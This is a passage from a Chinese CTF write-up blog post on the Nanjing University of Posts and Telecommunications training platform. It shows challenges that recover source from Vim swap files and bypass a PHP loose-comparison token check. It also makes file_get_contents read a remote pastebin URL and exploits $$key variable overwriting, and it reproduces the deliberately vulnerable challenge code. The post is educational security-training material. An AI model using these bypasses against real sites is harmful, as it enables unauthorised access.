<h3 id="1-32-&#x5BC6;&#x7801;&#x91CD;&#x7F6E;2"><a href="#1-32-&#x5BC6;&#x7801;&#x91CD;&#x7F6E;2" class="headerlink" title="1.32 &#x5BC6;&#x7801;&#x91CD;&#x7F6E;2"></a>1.32 &#x5BC6;&#x7801;&#x91CD;&#x7F6E;2</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">TIPS:</span><br><span class="line">1.&#x7BA1;&#x7406;&#x5458;&#x90AE;&#x7BB1;&#x89C2;&#x5BDF;&#x4E00;&#x4E0B;&#x5C31;&#x53EF;&#x4EE5;&#x627E;&#x5230;</span><br><span class="line">2.linux&#x4E0B;&#x4E00;&#x822C;&#x4F7F;&#x7528;vi&#x7F16;&#x8F91;&#x5668;&#xFF0C;&#x5E76;&#x4E14;&#x5F02;&#x5E38;&#x9000;&#x51FA;&#x4F1A;&#x7559;&#x4E0B;&#x5907;&#x4EFD;&#x6587;&#x4EF6;</span><br><span class="line">3.&#x5F31;&#x7C7B;&#x578B;bypass</span><br></pre></td></tr></table></figure>

<p>&#x5BA1;&#x67E5;&#x6E90;&#x7801;&#x83B7;&#x53D6;&#x5230;&#x90AE;&#x7BB1;&#xFF1A;<code>admin@nuptzj.cn</code> &#xFF0C;&#x53E6;&#x5916;&#x6CE8;&#x610F; <code>&lt;meta name=&quot;editor&quot; content=&quot;Vim&quot; /&gt;</code></p>
<p>&#x4F9D;&#x636E; TIPS-2 &#x4EE5; <code>.xxx.php.swp</code> &#x3001;<code>.xxx.php.swo</code> &#x3001;<code>.xxx.php.swn</code> &#x731C;&#x89E3;&#xFF0C;&#x83B7;&#x53D6;&#x5230;&#x6E90;&#x7801;&#x4FE1;&#x606F;</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line">........&#x8FD9;&#x4E00;&#x884C;&#x662F;&#x7701;&#x7565;&#x7684;&#x4EE3;&#x7801;........</span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">&#x5982;&#x679C;&#x767B;&#x5F55;&#x90AE;&#x7BB1;&#x5730;&#x5740;&#x4E0D;&#x662F;&#x7BA1;&#x7406;&#x5458;&#x5219; die()</span></span><br><span class="line"><span class="comment">&#x6570;&#x636E;&#x5E93;&#x7ED3;&#x6784;</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">--</span></span><br><span class="line"><span class="comment">-- &#x8868;&#x7684;&#x7ED3;&#x6784; `user`</span></span><br><span class="line"><span class="comment">--</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">CREATE TABLE IF NOT EXISTS `user` (</span></span><br><span class="line"><span class="comment">  `id` int(11) NOT NULL AUTO_INCREMENT,</span></span><br><span class="line"><span class="comment">  `username` varchar(255) NOT NULL,</span></span><br><span class="line"><span class="comment">  `email` varchar(255) NOT NULL,</span></span><br><span class="line"><span class="comment">  `token` int(255) NOT NULL DEFAULT &apos;0&apos;,</span></span><br><span class="line"><span class="comment">  PRIMARY KEY (`id`)</span></span><br><span class="line"><span class="comment">) ENGINE=MyISAM  DEFAULT CHARSET=utf8 AUTO_INCREMENT=2 ;</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">--</span></span><br><span class="line"><span class="comment">-- &#x8F6C;&#x5B58;&#x8868;&#x4E2D;&#x7684;&#x6570;&#x636E; `user`</span></span><br><span class="line"><span class="comment">--</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">INSERT INTO `user` (`id`, `username`, `email`, `token`) VALUES</span></span><br><span class="line"><span class="comment">(1, &apos;****&#x4E0D;&#x53EF;&#x89C1;***&apos;, &apos;***&#x4E0D;&#x53EF;&#x89C1;***&apos;, 0);</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">........&#x8FD9;&#x4E00;&#x884C;&#x662F;&#x7701;&#x7565;&#x7684;&#x4EE3;&#x7801;........</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(!<span class="keyword">empty</span>($token)&amp;&amp;!<span class="keyword">empty</span>($emailAddress)){</span><br><span class="line">	<span class="keyword">if</span>(strlen($token)!=<span class="number">10</span>) <span class="keyword">die</span>(<span class="string">&apos;fail&apos;</span>);</span><br><span class="line">	<span class="keyword">if</span>($token!=<span class="string">&apos;0&apos;</span>) <span class="keyword">die</span>(<span class="string">&apos;fail&apos;</span>);</span><br><span class="line">	$sql = <span class="string">&quot;SELECT count(*) as num from `user` where token=&apos;$token&apos; AND email=&apos;$emailAddress&apos;&quot;</span>;</span><br><span class="line">	$r = mysql_query($sql) <span class="keyword">or</span> <span class="keyword">die</span>(<span class="string">&apos;db error&apos;</span>);</span><br><span class="line">	$r = mysql_fetch_assoc($r);</span><br><span class="line">	$r = $r[<span class="string">&apos;num&apos;</span>];</span><br><span class="line">	<span class="keyword">if</span>($r&gt;<span class="number">0</span>){</span><br><span class="line">		<span class="keyword">echo</span> $flag;</span><br><span class="line">	}<span class="keyword">else</span>{</span><br><span class="line">		<span class="keyword">echo</span> <span class="string">&quot;&#x5931;&#x8D25;&#x4E86;&#x5440;&quot;</span>;</span><br><span class="line">	}</span><br><span class="line">}</span><br></pre></td></tr></table></figure>

<p>&#x91CD;&#x70B9;&#x5728;&#x5C3E;&#x7AEF; if &#x5224;&#x65AD;&#x5904;&#xFF0C;&#x9700;&#x8981;&#x63D0;&#x4EA4;&#x7684; <code>$token</code> &#x957F;&#x5EA6;&#x4E3A; 10 &#x5E76;&#x4E14;&#x503C;&#x7B49;&#x4E8E; 0&#x3002;&#x9A8C;&#x8BC1;&#x5904;&#x4F7F;&#x7528;&#x677E;&#x6563;&#x6BD4;&#x8F83;&#xFF0C;&#x6545;&#x53EF;&#x4EE5;&#x5229;&#x7528;&#x7C7B;&#x578B;&#x8F6C;&#x6362;&#x7ED5;&#x8FC7;&#x68C0;&#x6D4B;&#xFF0C;&#x6700;&#x7EC8;&#x63D0;&#x4EA4; token &#x4E3A; <code>0000000000</code> &#x5373;&#x53EF;&#x3002;</p>
<h3 id="1-33-file-get-contents"><a href="#1-33-file-get-contents" class="headerlink" title="1.33 file_get_contents"></a>1.33 file_get_contents</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&lt;!--$file = $_GET[<span class="string">&apos;file&apos;</span>];</span><br><span class="line"><span class="keyword">if</span>(@file_get_contents($file) == <span class="string">&quot;meizijiu&quot;</span>){</span><br><span class="line">    <span class="keyword">echo</span> $nctf;</span><br><span class="line">}--&gt;</span><br></pre></td></tr></table></figure>

<p>&#x8981;&#x6C42;&#x63A7;&#x5236;&#x8BFB;&#x53D6;&#x6587;&#x4EF6;&#x5185;&#x5BB9;&#x4E3A; <code>meizijiu</code></p>
<p>&#x7FFB;&#x770B;&#x624B;&#x518C;&#x53D1;&#x73B0; <code>file_get_contents()</code> &#x51FD;&#x6570;&#x652F;&#x6301;&#x901A;&#x8FC7; URL &#x8BFB;&#x53D6;&#x7F51;&#x9875;&#x5185;&#x5BB9;&#xFF0C;&#x5F00;&#x59CB;&#x6784;&#x601D;&#x4F7F;&#x5176;&#x8BFB;&#x53D6;&#x4E00;&#x4E2A;&#x4EC5;&#x5305;&#x542B;&#x6587;&#x672C; <code>meizijiu</code> &#x7684;&#x9875;&#x9762;&#x6EE1;&#x8DB3;&#x5224;&#x65AD;&#x3002;</p>
<p>&#x7136;&#x540E;&#x5C31;&#x8E29;&#x5751;&#x4E86;&#x3002;&#x3002;&#x3002;&#x3002;</p>
<p>&#x5728;&#x7EBF;&#x751F;&#x6210;&#x597D; raw &#x6587;&#x4EF6;&#x540E;&#xFF0C;&#x672C;&#x5730;&#x6D4B;&#x8BD5;&#x901A;&#x8FC7;&#xFF1A;</p>
<p><img src="/2019/09/26/&#x5357;&#x90AE;-CTF-&#x5E73;&#x53F0;&#x9898;&#x8BB0;/fgc1.png" alt="1569121692561"></p>
<p>&#x5C1D;&#x8BD5;&#x63D0;&#x4EA4; <code>?file=https://pastebin.com/raw/xwRWfusE</code> &#x65F6;&#x8D85;&#x65F6;&#x3002;&#x3002;&#x672C;&#x5730;&#x590D;&#x73B0;&#x65F6;&#x8D85;&#x65F6;&#x3002;&#x3002;&#x3002;</p>
<p>&#x6363;&#x9F13;&#x4E86;&#x534A;&#x5929;&#x53D1;&#x73B0;&#xFF0C;&#x662F;&#x56E0;&#x4E3A;&#x672C;&#x5730;&#x4EE3;&#x7406;&#x95EE;&#x9898;&#x3002;Chrome &#x91CC;&#x9762;&#x88C5;&#x7684; SwitchyOmega &#x63D2;&#x4EF6;&#x5C06;&#x5176;&#x5BFC;&#x5411;&#x4E86; proxy &#x901A;&#x9053;&#xFF0C;&#x5BFC;&#x81F4;&#x8BBF;&#x95EE;&#x9875;&#x9762;&#x8D85;&#x65F6;&#x3002;&#x5173;&#x952E;&#x662F;&#x4E0D;&#x5E26; <code>?file=https://pastebin.com/raw/xwRWfusE</code> &#x53C2;&#x6570;&#x65F6;&#xFF0C;&#x5C31;&#x53EF;&#x4EE5;&#x6B63;&#x5E38;&#x8BBF;&#x95EE;&#x3002;&#x4EC0;&#x4E48;&#x8C1C;&#x4E4B;&#x673A;&#x5236;&#xFF0C;&#x731C;&#x6D4B;&#x4EE3;&#x7406;&#x63D2;&#x4EF6;&#x8BEF;&#x4EE5;&#x540E;&#x9762;&#x53C2;&#x6570;&#x4E2D;&#x7684; url &#x51B3;&#x5B9A;&#x4E86;&#x4EE3;&#x7406;&#x901A;&#x9053;&#xFF0C;&#x5173;&#x95ED;&#x4EE3;&#x7406;&#x6216;&#x6307;&#x5B9A;&#x7CFB;&#x7EDF;&#x4EE3;&#x7406;&#x5C31;&#x53EF;&#x4EE5;&#x6B63;&#x5E38;&#x63D0;&#x4EA4;&#x83B7;&#x53D6; flag &#x3002;</p>
<p>( PS&#xFF1A;&#x8BE5;&#x9898;&#x4F7F;&#x7528; <strong><code>php://input</code></strong> &#x65B9;&#x5F0F;&#x89E3;&#x9898;&#x4F1A;&#x65B9;&#x4FBF;&#x5F88;&#x591A;&#xFF0C;&#x5F53;&#x65F6;&#x6CA1;&#x6709;&#x610F;&#x8BC6;&#x5230;&#x53EF;&#x4EE5;&#x5229;&#x7528;&#x4F2A;&#x534F;&#x8BAE;&#xFF0C;&#x4F2A;&#x534F;&#x8BAE;&#x65B9;&#x9762;&#x7684;&#x77E5;&#x8BC6;&#x6709;&#x5F85;&#x5F52;&#x7EB3;</p>
<h3 id="1-34-&#x53D8;&#x91CF;&#x8986;&#x76D6;"><a href="#1-34-&#x53D8;&#x91CF;&#x8986;&#x76D6;" class="headerlink" title="1.34 &#x53D8;&#x91CF;&#x8986;&#x76D6;"></a>1.34 &#x53D8;&#x91CF;&#x8986;&#x76D6;</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">&lt;!--<span class="keyword">foreach</span>($_GET <span class="keyword">as</span> $key =&gt; $value){  </span><br><span class="line">        $$key = $value;  </span><br><span class="line">}  </span><br><span class="line"><span class="keyword">if</span>($name == <span class="string">&quot;meizijiu233&quot;</span>){</span><br><span class="line">    <span class="keyword">echo</span> $flag;</span><br><span class="line">}--&gt;</span><br></pre></td></tr></table></figure>

<p>&#x6F0F;&#x6D1E;&#x89E6;&#x53D1;&#x70B9;&#xFF1A;<code>$$key = $value;</code></p>
<p>&#x5047;&#x82E5;&#x4F20;&#x8FDB;&#x7684;&#x53C2;&#x6570;&#x662F;<code>?a=1</code>&#xFF0C;&#x5219; <code>$_key = a</code>&#xFF0C;&#x6B64;&#x65F6;<code>$$_key =&gt; $a</code>&#xFF0C;&#x5BFC;&#x81F4;&#x4E86;&#x53D8;&#x91CF;&#x8986;&#x76D6;</p>
<h3 id="1-35-&#x6CE8;&#x610F;&#xFF01;&#xFF01;"><a href="#1-35-&#x6CE8;&#x610F;&#xFF01;&#xFF01;" class="headerlink" title="1.35 &#x6CE8;&#x610F;&#xFF01;&#xFF01;"></a>1.35 &#x6CE8;&#x610F;&#xFF01;&#xFF01;</h3><p>&#x540E;&#x9762;&#x4E24;&#x9898;&#x6302;&#x4E86; ~ &#x8FD9;&#x91CC;&#x5C31;&#x5F53;&#x4F5C;&#x672C;&#x7BC7; WriteUP &#x7684;&#x603B;&#x7ED3;&#x5427;</p>
<p><strong>&#x51FA;&#x9898;&#x4E0D;&#x6613;&#xFF0C;&#x611F;&#x8C22;&#x5E08;&#x5085;&#x4EEC;&#x63D0;&#x4F9B;&#x7684;&#x5E73;&#x53F0;&#xFF01;</strong></p>
<p>&#x5E0C;&#x671B;&#x4E0B;&#x6B21;&#x81EA;&#x5DF1;&#x4E0D;&#x4F1A;&#x8FD9;&#x4E48;&#x83DC;</p>
<h3 id="1-36-HateIT"><a href="#1-36-HateIT" class="headerlink" title="1.36 HateIT"></a>1.36 HateIT</h3><p>Pass ~</p>
<h3 id="1-37-Anonymous"><a href="#1-37-Anonymous" class="headerlink" title="1.37 Anonymous"></a>1.37 Anonymous</h3><p>Pass ~</p>
<h2 id="Refer"><a href="#Refer" class="headerlink" title="Refer"></a>Refer</h2><p><strong><a href="https://findneo.github.io/170924NuptCTFWP/" target="_blank" rel="noopener">&#x5357;&#x4EAC;&#x90AE;&#x7535;&#x5927;&#x5B66;&#x7F51;&#x7EDC;&#x653B;&#x9632;&#x8BAD;&#x7EC3;&#x5E73;&#x53F0;writeup</a> [1.21 &#x4E0A;&#x4F20;&#x7ED5;&#x8FC7;]</strong></p>
<p><strong><a href="https://www.leavesongs.com/PENETRATION/mutibyte-sql-inject.html" target="_blank" rel="noopener">&#x6D45;&#x6790;&#x767D;&#x76D2;&#x5BA1;&#x8BA1;&#x4E2D;&#x7684;&#x5B57;&#x7B26;&#x7F16;&#x7801;&#x53CA;SQL&#x6CE8;&#x5165;</a></strong></p>
<p><strong><a href="https://www.k0rz3n.com/2017/11/21/mysqltrick/" target="_blank" rel="noopener">CTF&#x4E2D;&#x6CE8;&#x5165;&#x5E38;&#x89C1;&#x6280;&#x5DE7;&#x7684;&#x6C47;&#x603B;</a></strong></p>
<p><strong><a href="http://otuki.top/CTF&#x4E2D;&#x5E38;&#x89C1;PHP&#x6F0F;&#x6D1E;&#x603B;&#x7ED3;/" target="_blank" rel="noopener">CTF&#x4E2D;&#x5E38;&#x89C1;PHP&#x6F0F;&#x6D1E;&#x603B;&#x7ED3;</a></strong></p>
<p><strong><a href="https://blog.csdn.net/u014549283/article/details/81842084" target="_blank" rel="noopener">webshell&#x56DE;&#x8C03;php&#x603B;&#x7ED3;</a></strong></p>

        </div>

        
            <section class="post-copyright">
                
                    <p class="copyright-item">
                        <span>Author:</span>
                        <span>c0r1</span>
                    </p>
                
                
                    <p class="copyright-item">
                        <span>Permalink:</span>
                        <span><a href="http://www.c0r1.com/2019/09/26/南邮-CTF-平台题记/">http://www.c0r1.com/2019/09/26/南邮-CTF-平台题记/</a></span>
                    </p>
                
                
                    <p class="copyright-item">
                        <span>License:</span>
                        <span>Copyright (c) 2019 <a href="http://creativecommons.org/licenses/by-nc/4.0/">CC-BY-NC-4.0</a> LICENSE</span>
                    </p>
                
                

            </section>
        
        <section class="post-tags">
            <div>
                <span>Tag(s):</span>
                <span class="tag">
                    
                </span>
            </div>
            <div>
                <a href="javascript:window.history.back();">back</a>
                <span>· </span>
                <a href="/">home</a>
            </div>
        </section>
        <section class="post-nav">
            
                <a class="prev" rel="prev" href="/2019/10/20/DPAPI/">DPAPI</a>
            
            
        </section>


    </article>
</div>

        </div>
        <footer id="footer" class="footer">
    <div class="copyright">
        <span>© c0r1 | Powered by <a href="https://hexo.io" target="_blank">Hexo</a> & <a href="https://github.com/Siricee/hexo-theme-Chic" target="_blank">Chic</a></span>
    </div>
</footer>

    </div>
</body>
</html>
